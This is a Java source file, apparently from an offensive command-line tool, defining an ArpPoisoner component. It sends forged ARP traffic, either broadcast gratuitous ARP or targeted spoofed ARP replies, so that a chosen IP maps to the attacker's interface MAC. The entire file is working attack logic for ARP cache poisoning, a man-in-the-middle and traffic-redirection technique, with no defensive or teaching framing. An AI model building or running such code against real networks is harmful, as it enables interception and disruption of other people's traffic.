package io.gl4dius.cli.module.arp;

import io.gl4dius.cli.assets.PoisoningMode;
import io.gl4dius.cli.utility.NetInterfaceUtil;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;

@Slf4j
@Component
@RequiredArgsConstructor
public class ArpPoisoner {

    private final ArpSender arpSender;

    public void poison(String nicName, PoisoningMode poisoningMode, String spoofIp, String targetIp, String targetMac) {
        try {
            if (poisoningMode != PoisoningMode.TARGET_SPECIFIC && (targetIp != null || targetMac != null)) {
                throw new IllegalArgumentException("Target IP/MAC can only be used in TS mode");
            }

            if (poisoningMode == PoisoningMode.TARGET_SPECIFIC && (targetIp == null || targetMac == null)) {
                throw new IllegalArgumentException("Target IP/MAC is required in TS mode");
            }

            var nic = NetInterfaceUtil.findInterface(nicName);
            if (poisoningMode == PoisoningMode.BROADCAST) {
                this.arpSender.sendGratuitousArp(nicName, spoofIp, NetInterfaceUtil.resolveMac(nic).toString());
            } else {
                this.arpSender.sendArpReply(nicName, spoofIp, NetInterfaceUtil.resolveMac(nic).toString(), targetIp, targetMac);
            }
        } catch (Exception e) {
            log.error("Failed to poison ARP", e);
        }
    }
}
